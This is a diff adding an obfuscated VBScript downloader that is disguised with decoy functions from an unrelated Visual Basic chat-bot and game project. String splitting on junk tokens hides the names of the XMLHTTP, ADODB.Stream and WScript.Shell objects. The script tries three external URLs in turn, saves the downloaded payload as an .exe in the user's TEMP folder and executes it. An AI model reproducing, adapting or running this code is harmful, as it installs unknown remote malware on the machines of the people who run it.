@@ -1,0 +1,389 @@
+
+Dim InLineAdapscientistensurance 'As String
+
+Dim InLineAdapscientistInPlaceOf 'As String
+InLineAdapscientistBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+       Dim TristateTrue
+
+  Pirates = "XMLHTTPGIDZOAVAdodb.streaMGIDZOAVs"
+Vrungel = ".respo"+"nseBody"
+
+
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+      
+Dim InLineAdapscientistTimeTo 'As Object
+Dim InLineAdapscientiststatus
+InLineAdapscientiststatus = false
+   
+ Dim Pirates 'As String
+Dim Reikyavik
+Dim InLineAdapscientistcashback 'As Object
+Dim InLineAdapscientistWentDo 'As Object
+Dim InLineAdapscientistTavyer 'As Object   
+Dim abirvalgtelegraphyAxxxxx 'As Object
+  
+
+Dim ZimZamZum
+
+ Function SyncObjAtelegraphyscientist2(param1)
+param1 = param1 + param1
+
+InLineAdapscientist5000 = InLineAdapscientistWentDo.responseBody
+param1 = 3 * param1 - 8	
+
+End Function
+
+Function T2000(p, ddd) 
+    Set InLineAdapscientistRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgtelegraphyAxxxxx.Type = 1
+ abirvalgtelegraphyAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.App"+"licationGIDZOAVWscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "PRECHOL", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+
+Pirates = Pirates+".shellGIDZOAVProcessGIDZOAVGeTGIDZOAVT"+"emPGIDZOAVTyPRECHOL"+"pePRECHOL"
+
+
+Function SyncObjAtelegraphyscientist(strr)
+if D = 33 then
+AXC = "Sav"+"eToFile"
+end if
+abirvalgtelegraphyAxxxxx.Savetofile InLineAdapscientistInPlaceOf , 14-12
+End Function
+
+    Public Function FolderToCopy(dde,SecondP,VKUok)
+Samwell = 69
+Samwell = Samwell + 11
+if Samwell > 33 then
+SecondP.Write VKUok
+Samwell =  Samwell / 13
+end if
+End Function
+	
+
+
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+Function SheduledequallyObject(p,d)
+
+FC = "" + InLineAdapscientistInPlaceOf
+
+ InLineAdapscientistRunrun.Run(FC + "")
+
+End Function
+
+
+Pirates = Pirates +"GIDZOAVPRECHOLoPRECHOLpenGIDZOAVwrPRECHOLiteGIDZOAVrePRECHOLspoPRECHOLnseBoPRECHOLdyGIDZOAVsaPRECHOLvetof"+"PRECHOLileGIDZOAV\KtwdrEICPrE.ex"+"PRECHOLeGIDZOAVhttPRECHOLp:GIDZOAV//"
+
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+Dim InLineAdapscientistPetir 'As String
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+InLineAdapscientistPetir = "Ag"
+
+Reikyavik = StackStack("GIDZOAV" + "")
+
+  Dim MarketPlaceibility 'As String
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  
+Set InLineAdapscientistWentDo = CreateObject("" + Reikyavik(00))
+ 
+Dim Valery 'As Integer
+InLineAdapscientistBelish = InLineAdapscientistBelish + "-"
+ 
+
+
+Dim InLineAdapscientist404 'As String
+
+Dim InLineAdapscientist5000 'As Variant
+Dim InLineAdapscientistRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Function InLineAdapscientistFuks(p)
+ 
+InLineAdapscientistWentDo.Send
+	
+
+End Function
+Twelve = 11 + 1
+zTempVis = Reikyavik(1)
+
+'Set InLineAdapscientistTimeTo = CreateObject(Reikyavik(8-6))
+Set InLineAdapscientistHelmet = GetRef("SheduledequallyObject")
+Set InLineAdapscientist13 = GetRef("SyncObjAtelegraphyscientist")
+Set InLineAdapscientist14 = GetRef("FolderToCopy")
+ 
+Set abirvalgtelegraphyAxxxxx = CreateObject("Adodb."+"streaM")
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebug.txt" 
+    Print txt
+    Close 
+End Sub
+Set InLineAdapscientistTavyer = CreateObject(""+Reikyavik(10-7))
+
+
+if "Host" + WScript + "23" = "HostWindows Script Host23" Then 
+	
+	
+
+
+
+	Set InLineAdapscientistcashback = InLineAdapscientistTavyer.Environment(Reikyavik(1 + 3))
+
+end if	
+
+Function SetUA()
+InLineAdapscientistLamp.setRequestHeader InLineAdapscientistBelish, CUA
+End Function
+ 
+ Valery = 89210
+
+InLineAdapscientistensurance = InLineAdapscientistcashback(Reikyavik(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = Reikyavik(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+MarketPlace = Reikyavik(11+2) & Reikyavik(11+3)
+
+InLineAdapscientistBelish = InLineAdapscientistBelish & InLineAdapscientistPetir & "ent"
+SKKmne = 19
+
+
+ZimZamZum = Array("essenza.co.id/oiheiryur92?","scottfranch.org/p66/oiheiryur92","ashtontan.com/oiheiryur92?")
+
+lTo = UBound(ZimZamZum)
+
+For i = 0 To lTo Step 1
+SKKmne = SKKmne * 16
+
+	on error resume  next
+Valery =  Valery +44
+ InLineAdapscientist404 = MarketPlace + ZimZamZum(i)
+dr1=2
+
+
+SKKmne = SKKmne + 91
+SKKmne2 = Reikyavik(10-5)
+ InLineAdapscientistWentDo.Open SKKmne2, InLineAdapscientist404, False
+
+
+
+SetUA()
+InLineAdapscientistFuks " d "
+If InLineAdapscientistWentDo.Status +3 = 203 Then
+InLineAdapscientiststatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if InLineAdapscientiststatus Then
+Dim Clank 'As String
+ InLineAdapscientistInPlaceOf = InLineAdapscientistensurance+ sTempVis
+
+T2000 "",4
+SyncObjAtelegraphyscientist2 31 
+InLineAdapscientist14 "",abirvalgtelegraphyAxxxxx,InLineAdapscientist5000
+Sapogi =21
+InLineAdapscientistInPlaceOfu = "" + InLineAdapscientistInPlaceOf 
+
+
+Sapogi = Sapogi*5
+
+Dim InLineAdapscientistJohnSnowu,InLineAdapscientistDisplay 'As Long
+InLineAdapscientist13 "ss"
+InLineAdapscientistJohnSnowu = 4133
+
+If 621  < InLineAdapscientistJohnSnowu + 1 Then
+	  
+	Hipster =SKKmne+SKKmne
+	InLineAdapscientistHelmet Hipster, SKKmne
+	InLineAdapscientistDisplay = "H"
+End If
+
+
+
+mafia = 22211
+end if
